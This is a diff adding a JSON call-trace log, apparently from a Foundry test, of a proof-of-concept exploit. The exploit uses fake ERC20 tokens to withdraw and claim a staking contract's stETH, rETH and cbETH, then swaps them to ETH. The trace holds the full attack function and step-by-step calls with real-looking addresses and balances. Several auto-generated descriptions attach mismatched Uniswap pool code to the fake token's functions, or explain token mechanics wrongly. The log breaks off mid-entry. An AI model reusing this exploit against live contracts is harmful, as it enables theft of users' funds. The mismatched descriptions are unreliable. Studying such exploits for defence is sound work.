@@ -1,0 +1,1171 @@
+{
+  "logs": {
+    "calls": [
+      {
+        "id": "4335246",
+        "contract": "ASTTest",
+        "function": "testExpolit",
+        "args": "",
+        "original_code": "    function testExpolit() public {\n        address[] memory stakedTokens = new address[](3);\n        stakedTokens[0] = address(stETH);\n        stakedTokens[1] = address(rETH);\n        stakedTokens[2] = address(cbETH);\n        deal(address(this), 0);\n        uint256[] memory balances = new uint256[](3);\n        emit log_named_decimal_uint(\"Attacker Eth balance before attack:\", address(this).balance, 18);\n        for (uint8 i = 0; i < stakedTokens.length; i++) {\n            uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));\n            balances[i] = staked_bal;\n            MyERC20 fake_token = new MyERC20(stakedTokens[i], staked_bal);\n            fake_token.mint(10_000 * 1e18);\n            fake_token.approve(address(vulnerable), type(uint256).max);\n\n            vulnerable.withdraw(address(fake_token), staked_bal);\n            vulnerable.claim(i);\n        }\n\n        //changing stETH to eth\n        stETH.approve(address(LidoCurvePool), balances[0]);\n        LidoCurvePool.exchange(1, 0, balances[0], 0);\n\n        //changing rETH to weth\n        rETH.approve(address(rETHPool), balances[1]);\n        rETHPool.swap(address(this), true, int256(balances[1]), 4_295_128_740, new bytes(0));\n\n        //changing cbETH to weth\n        cbETH.approve(address(cbETHPool), balances[2]);\n        cbETHPool.swap(address(this), true, int256(balances[2]), 4_295_128_740, new bytes(0));\n\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        emit log_named_decimal_uint(\"Attacker Eth balance after attack:\", address(this).balance, 18);\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExpolit` function is designed to simulate an attack on a vulnerable contract by interacting with multiple staked tokens (stETH, rETH, cbETH). It first retrieves the balances of these tokens from the vulnerable contract, creates fake tokens, and mints a large amount of them. Then, it withdraws the staked tokens from the vulnerable contract and claims rewards. Finally, it converts these tokens into ETH through various pools (LidoCurvePool, rETHPool, cbETHPool) and withdraws the ETH to the attacker's address. The function also logs the attacker's ETH balance before and after the attack.\n\n2. Security mechanism:  \nThe function does not include explicit security mechanisms or modifiers. Instead, it appears to exploit vulnerabilities in the `vulnerable` contract by creating and using fake tokens. The use of `deal(address(this), 0)` suggests that the attacker's ETH balance is reset to zero before the attack, possibly to isolate the attack's effects. However, the function itself does not implement defensive measures, as it is designed to simulate an attack rather than protect against one.\n\n3. Parameter Function:  \nThe function does not take any parameters. All the necessary data, such as the addresses of staked tokens and pools, is hardcoded within the function. This makes the function specific to the tokens and contracts it interacts with, limiting its flexibility but ensuring it works as intended for this particular scenario.\n\n4. Return description:  \nThe function does not return any value. Instead, it emits two log events: one showing the attacker's ETH balance before the attack and another showing the balance after the attack. These logs are used to track the success of the attack by comparing the ETH balance before and after the exploit.\n\nIn summary,  \nThe `testExpolit` function simulates an attack on a vulnerable contract by interacting with staked tokens, creating fake tokens, and converting them into ETH. It does not include security mechanisms, as it is designed to exploit vulnerabilities rather than defend against them. The function does not take any parameters and does not return a value but logs the attacker's ETH balance before and after the attack to measure its success.",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "deal",
+            "value": null,
+            "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "33968",
+            "contract": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+            "function": "balanceOf",
+            "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+            "description": "1. **Core functions**:  \n   The `balanceOf` function is designed to check and return the token balance of a specific account. It simply looks up the balance associated with the given account address and provides that information. This is a basic and essential function in token contracts to allow users or other contracts to query how many tokens an account holds.\n\n2. **Security mechanism**:  \n   The function is marked as `public`, meaning it can be called by anyone, and `view`, which ensures it does not modify the state of the contract (it only reads data). The `virtual` and `override` keywords indicate that this function can be extended or modified by derived contracts, providing flexibility for future updates or customizations.\n\n3. **Parameter Function**:  \n   The function takes one parameter, `account`, which is an Ethereum address. This parameter specifies the account whose token balance is being queried. The function uses this address to look up the corresponding balance in the `_balances` mapping.\n\n4. **Return description**:  \n   The function returns a `uint256` value, which represents the token balance of the specified account. It directly retrieves this value from the `_balances` mapping, where the account address serves as the key to access the balance.\n\n**In summary**, the `balanceOf` function is a straightforward utility that allows anyone to check the token balance of a specific account by providing its address. It is secure, read-only, and can be customized in derived contracts.",
+            "return_value": "64176037513415148812 [6.417e19]",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "8263",
+                "contract": "0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc",
+                "function": "getApp",
+                "value": null,
+                "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "2820",
+                    "contract": "0x2b33CF282f867A7FF693A66e11B0FcC5552e4425",
+                    "function": "getApp",
+                    "value": null,
+                    "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                    "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "15088",
+                "contract": "0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb",
+                "function": "balanceOf",
+                "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                "flag": 1,
+                "return_value": "64176037513415148812 [6.417e19]",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "602106",
+            "contract": "→ new MyERC20@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f",
+            "function": "constructor",
+            "args": "",
+            "return_value": "2782 bytes of code",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "47107",
+            "contract": "MyERC20",
+            "function": "mint",
+            "args": "10000000000000000000000 [1e22]",
+            "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external override lock returns (uint256 amount0, uint256 amount1) {\n        require(amount > 0);\n        (, int256 amount0Int, int256 amount1Int) =\n            _modifyPosition(\n                ModifyPositionParams({\n                    owner: recipient,\n                    tickLower: tickLower,\n                    tickUpper: tickUpper,\n                    liquidityDelta: int256(amount).toInt128()\n                })\n            );\n\n        amount0 = uint256(amount0Int);\n        amount1 = uint256(amount1Int);\n\n        uint256 balance0Before;\n        uint256 balance1Before;\n        if (amount0 > 0) balance0Before = balance0();\n        if (amount1 > 0) balance1Before = balance1();\n        IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);\n        if (amount0 > 0) require(balance0Before.add(amount0) <= balance0(), 'M0');\n        if (amount1 > 0) require(balance1Before.add(amount1) <= balance1(), 'M1');\n\n        emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+            "description": "1. Core functions:  \nThe `mint` function is designed to create or add liquidity to a specific range within a decentralized exchange pool. It allows a user (recipient) to provide liquidity by specifying a range (defined by `tickLower` and `tickUpper`) and an amount of tokens (`amount`). The function then adjusts the liquidity in the pool and calculates the required token amounts (`amount0` and `amount1`) for the transaction. It also ensures that the necessary tokens are transferred correctly by calling a callback function.\n\n2. Security mechanism:  \nThe function includes several security measures:  \n- The `lock` modifier prevents reentrancy attacks by ensuring the function cannot be called again until it completes.  \n- The `require(amount > 0)` check ensures the liquidity amount provided is valid and greater than zero.  \n- After the callback, the function verifies that the correct token balances have been updated using `require` statements, preventing incorrect or malicious transfers.  \n- The `external` and `override` keywords ensure the function is only callable from outside the contract and correctly implements an interface.\n\n3. Parameter Function:  \n- `recipient`: The address that will receive the liquidity position.  \n- `tickLower` and `tickUpper`: Define the price range within which the liquidity is provided.  \n- `amount`: The amount of liquidity to be added.  \n- `data`: Additional data passed to the callback function, often used for token transfers or other operations.  \n\n4. Return description:  \nThe function returns two values, `amount0` and `amount1`, which represent the amounts of two tokens required to provide the specified liquidity. These values are calculated by the `_modifyPosition` function, which adjusts the liquidity in the pool and determines the token amounts needed based on the provided range and liquidity amount.  \n\nIn summary, the `mint` function allows users to add liquidity to a specific price range in a decentralized exchange pool, ensures the transaction is secure, and returns the required token amounts for the operation.",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "25056",
+            "contract": "MyERC20",
+            "function": "approve",
+            "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+            "description": "1. **Core functions:**  \n   The `approve` function allows the caller (the owner of tokens) to give permission to another address (called the `spender`) to spend a specific amount of tokens on their behalf. This is commonly used in token contracts to enable delegated spending, such as in decentralized exchanges or other applications where one party needs to manage another's tokens.\n\n2. **Security mechanism:**  \n   - The function uses the `public` modifier, meaning it can be called by anyone.  \n   - It also uses the `virtual` and `override` modifiers, indicating that this function can be customized or extended in derived contracts and is overriding a function from a parent contract.  \n   - The `_approve` internal function is used to handle the actual approval logic, which helps encapsulate and secure the process.  \n\n3. **Parameter Function:**  \n   - `spender`: This is the address of the account that is being granted permission to spend tokens.  \n   - `amount`: This is the maximum number of tokens the `spender` is allowed to manage on behalf of the caller.  \n\n4. **Return description:**  \n   The function always returns `true` after successfully executing the `_approve` function, indicating that the approval process was completed successfully.  \n\n**In summary,**  \nThe `approve` function is used to delegate token spending permissions to another address. It ensures security by encapsulating the approval logic in an internal function and always returns `true` to confirm the operation's success.",
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "495212",
+            "contract": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "function": "withdraw",
+            "args": "MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 64176037513415148812 [6.417e19]",
+            "original_code": "",
+            "description": "",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "490183",
+                "contract": "0x4D5B4B9Ccf52bBcFE7B71b3038D8577293779E0C",
+                "function": "withdraw",
+                "args": "MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 64176037513415148812 [6.417e19]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "847",
+                    "contract": "MyERC20",
+                    "function": "balanceOf",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "flag": 1,
+                    "return_value": "10000000000000000000000 [1e22]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "1147",
+                    "contract": "MyERC20",
+                    "function": "allowance",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+                    "description": "1. **Core functions:**  \n   This function checks how much of the owner's tokens the spender is allowed to use. It acts like a permission checker, ensuring that the spender has the right to transfer a certain amount of tokens on behalf of the owner.\n\n2. **Security mechanism:**  \n   - `public`: This means the function can be called by anyone, ensuring transparency.  \n   - `view`: This indicates the function only reads data and does not modify the state of the contract, making it safe to call.  \n   - `virtual override`: This allows the function to be customized or extended in derived contracts, providing flexibility while maintaining security.  \n\n3. **Parameter Function:**  \n   - `owner`: This is the address of the person who owns the tokens.  \n   - `spender`: This is the address of the person who is allowed to use the owner's tokens.  \n\n4. **Return description:**  \n   The function returns the amount of tokens the spender is allowed to transfer from the owner's account. It does this by looking up the value stored in the `_allowances` mapping, which keeps track of these permissions.  \n\nIn summary, this function is a simple and secure way to check how much a spender can use from an owner's token balance. It uses clear parameters and ensures safety by only reading data without making any changes.",
+                    "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "685",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "original_code": "",
+                    "description": "",
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "26555",
+                    "contract": "MyERC20",
+                    "function": "transferFrom",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 64176037513415148812 [6.417e19]",
+                    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n",
+                    "description": "1. **Core functions**:  \n   The `transferFrom` function is designed to move a specified amount of tokens from one account (`sender`) to another (`recipient`). This function is typically used when a third party (like a smart contract or another user) has been granted permission to manage tokens on behalf of the `sender`. It ensures that tokens can be transferred securely and efficiently between accounts.\n\n2. **Security mechanism**:  \n   The function is marked as `external`, meaning it can only be called from outside the contract, ensuring controlled access. Additionally, the function relies on the `Approval` event, which tracks and verifies that the `sender` has authorized the transfer of tokens. This prevents unauthorized transfers. The `Transfer` event is also emitted to log the transaction, providing transparency and traceability.\n\n3. **Parameter Function**:  \n   - `sender`: The address of the account from which tokens are being sent.  \n   - `recipient`: The address of the account receiving the tokens.  \n   - `amount`: The number of tokens to be transferred.  \n\n   These parameters ensure the function knows where the tokens are coming from, where they are going, and how many are being moved.\n\n4. **Return description**:  \n   The function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. If the transfer completes without issues, it returns `true`. If there’s a problem (e.g., insufficient balance or unauthorized access), it returns `false`.\n\nIn summary, the `transferFrom` function securely transfers tokens between accounts, uses events to track approvals and transfers, and provides clear feedback on the success or failure of the operation.",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "685",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "654",
+                    "contract": "MyERC20",
+                    "function": "stakedTokenAddress",
+                    "args": "",
+                    "original_code": "",
+                    "description": "",
+                    "return_value": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "716",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceToBalance",
+                    "args": "0",
+                    "original_code": "",
+                    "description": "",
+                    "return_value": "64176037513415148812 [6.417e19]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "6468",
+                    "contract": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+                    "function": "balanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "64176037513415148812 [6.417e19]",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "1763",
+                        "contract": "0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc",
+                        "function": "getApp",
+                        "value": null,
+                        "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                        "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "820",
+                            "contract": "0x2b33CF282f867A7FF693A66e11B0FcC5552e4425",
+                            "function": "getApp",
+                            "value": null,
+                            "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                            "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "3088",
+                        "contract": "0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb",
+                        "function": "balanceOf",
+                        "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                        "flag": 1,
+                        "return_value": "64176037513415148812 [6.417e19]",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "3505",
+                    "contract": "MyERC20",
+                    "function": "burn",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 64176037513415148812 [6.417e19]",
+                    "original_code": "    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external override lock returns (uint256 amount0, uint256 amount1) {\n        (Position.Info storage position, int256 amount0Int, int256 amount1Int) =\n            _modifyPosition(\n                ModifyPositionParams({\n                    owner: msg.sender,\n                    tickLower: tickLower,\n                    tickUpper: tickUpper,\n                    liquidityDelta: -int256(amount).toInt128()\n                })\n            );\n\n        amount0 = uint256(-amount0Int);\n        amount1 = uint256(-amount1Int);\n\n        if (amount0 > 0 || amount1 > 0) {\n            (position.tokensOwed0, position.tokensOwed1) = (\n                position.tokensOwed0 + uint128(amount0),\n                position.tokensOwed1 + uint128(amount1)\n            );\n        }\n\n        emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);\n    }\n\n    struct SwapCache {\n        // the protocol fee for the input token\n        uint8 feeProtocol;\n        // liquidity at the beginning of the swap\n        uint128 liquidityStart;\n        // the timestamp of the current block\n        uint32 blockTimestamp;\n        // the current value of the tick accumulator, computed only if we cross an initialized tick\n        int56 tickCumulative;\n        // the current value of seconds per liquidity accumulator, computed only if we cross an initialized tick\n        uint160 secondsPerLiquidityCumulativeX128;\n        // whether we've computed and cached the above two accumulators\n        bool computedLatestObservation;\n    }\n\n    // the top level state of the swap, the results of which are recorded in storage at the end\n    struct SwapState {\n        // the amount remaining to be swapped in/out of the input/output asset\n        int256 amountSpecifiedRemaining;\n        // the amount already swapped out/in of the output/input asset\n        int256 amountCalculated;\n        // current sqrt(price)\n        uint160 sqrtPriceX96;\n        // the tick associated with the current price\n        int24 tick;\n        // the global fee growth of the input token\n        uint256 feeGrowthGlobalX128;\n        // amount of input token paid as protocol fee\n        uint128 protocolFee;\n        // the current liquidity in range\n        uint128 liquidity;\n    }\n\n    struct StepComputations {\n        // the price at the beginning of the step\n        uint160 sqrtPriceStartX96;\n        // the next tick to swap to from the current tick in the swap direction\n        int24 tickNext;\n        // whether tickNext is initialized or not\n        bool initialized;\n        // sqrt(price) for the next tick (1/0)\n        uint160 sqrtPriceNextX96;\n        // how much is being swapped in in this step\n        uint256 amountIn;\n        // how much is being swapped out\n        uint256 amountOut;\n        // how much fee is being paid in\n        uint256 feeAmount;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+                    "description": "1. **Core functions:**\n   The `burn` function is designed to reduce or \"burn\" a specific amount of liquidity from a position defined by `tickLower` and `tickUpper`. This function adjusts the position's liquidity and calculates the amounts of two tokens (`amount0` and `amount1`) that are owed to the position owner as a result of the burn. It also updates the owed tokens in the position and emits an event to log the burn action.\n\n2. **Security mechanism:**\n   The function uses the `lock` modifier, which ensures that the function cannot be re-entered while it is being executed. This prevents potential reentrancy attacks, where an attacker could repeatedly call the function to manipulate the state or drain funds. Additionally, the function is marked as `external` and `override`, meaning it can only be called from outside the contract and it overrides a function from an inherited interface, ensuring it adheres to a specific standard.\n\n3. **Parameter Function:**\n   - `tickLower` and `tickUpper`: These parameters define the range of the position in terms of price ticks. The function will burn liquidity from this specific range.\n   - `amount`: This is the amount of liquidity to be burned. It is specified as a `uint128`, which is a large enough number to represent significant liquidity values.\n\n4. **Return description:**\n   The function returns two values, `amount0` and `amount1`, which represent the amounts of the two tokens owed to the position owner after burning the specified liquidity. These values are calculated by converting the negative values of `amount0Int` and `amount1Int` (which are the changes in token amounts due to the burn) into positive `uint256` values. If either `amount0` or `amount1` is greater than zero, the owed tokens in the position are updated accordingly.\n\nIn summary, the `burn` function reduces liquidity from a specific position, calculates the owed token amounts, updates the position's owed tokens, and logs the action. It uses the `lock` modifier to prevent reentrancy attacks and ensures the function adheres to a specific standard by being `external` and `override`. The parameters define the position range and the amount of liquidity to burn, and the return values represent the owed token amounts after the burn.",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "91707",
+            "contract": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "function": "claim",
+            "args": "0",
+            "original_code": "",
+            "description": "",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "91181",
+                "contract": "0x4D5B4B9Ccf52bBcFE7B71b3038D8577293779E0C",
+                "function": "claim",
+                "args": "0",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "654",
+                    "contract": "MyERC20",
+                    "function": "stakedTokenAddress",
+                    "args": "",
+                    "flag": 1,
+                    "return_value": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "39183",
+                    "contract": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+                    "function": "transfer",
+                    "value": null,
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 64176037513415148812 [6.417e19]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "1763",
+                        "contract": "0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc",
+                        "function": "getApp",
+                        "value": null,
+                        "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                        "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "820",
+                            "contract": "0x2b33CF282f867A7FF693A66e11B0FcC5552e4425",
+                            "function": "getApp",
+                            "value": null,
+                            "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                            "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "35797",
+                        "contract": "0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb",
+                        "function": "transfer",
+                        "value": null,
+                        "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 64176037513415148812 [6.417e19]",
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "2486",
+            "contract": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+            "function": "balanceOf",
+            "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "flag": 1,
+            "return_value": "39165842900855519099 [3.916e19]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "602106",
+            "contract": "→ new MyERC20@0x2e234DAe75C793f67A35089C9d99245E1C58470b",
+            "function": "constructor",
+            "args": "",
+            "return_value": "2782 bytes of code",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "47107",
+            "contract": "MyERC20",
+            "function": "mint",
+            "args": "10000000000000000000000 [1e22]",
+            "flag": 1,
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "25056",
+            "contract": "MyERC20",
+            "function": "approve",
+            "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "487030",
+            "contract": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "function": "withdraw",
+            "args": "MyERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 39165842900855519099 [3.916e19]",
+            "flag": 1,
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "486501",
+                "contract": "0x4D5B4B9Ccf52bBcFE7B71b3038D8577293779E0C",
+                "function": "withdraw",
+                "args": "MyERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 39165842900855519099 [3.916e19]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "847",
+                    "contract": "MyERC20",
+                    "function": "balanceOf",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "flag": 1,
+                    "return_value": "10000000000000000000000 [1e22]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "1147",
+                    "contract": "MyERC20",
+                    "function": "allowance",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "685",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "26555",
+                    "contract": "MyERC20",
+                    "function": "transferFrom",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 39165842900855519099 [3.916e19]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "685",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "654",
+                    "contract": "MyERC20",
+                    "function": "stakedTokenAddress",
+                    "args": "",
+                    "flag": 1,
+                    "return_value": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "716",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceToBalance",
+                    "args": "0",
+                    "flag": 1,
+                    "return_value": "39165842900855519099 [3.916e19]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "486",
+                    "contract": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                    "function": "balanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "39165842900855519099 [3.916e19]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "3505",
+                    "contract": "MyERC20",
+                    "function": "burn",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 39165842900855519099 [3.916e19]",
+                    "flag": 1,
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "88349",
+            "contract": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "function": "claim",
+            "args": "1",
+            "flag": 1,
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "87823",
+                "contract": "0x4D5B4B9Ccf52bBcFE7B71b3038D8577293779E0C",
+                "function": "claim",
+                "args": "1",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "654",
+                    "contract": "MyERC20",
+                    "function": "stakedTokenAddress",
+                    "args": "",
+                    "flag": 1,
+                    "return_value": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "35825",
+                    "contract": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                    "function": "transfer",
+                    "value": null,
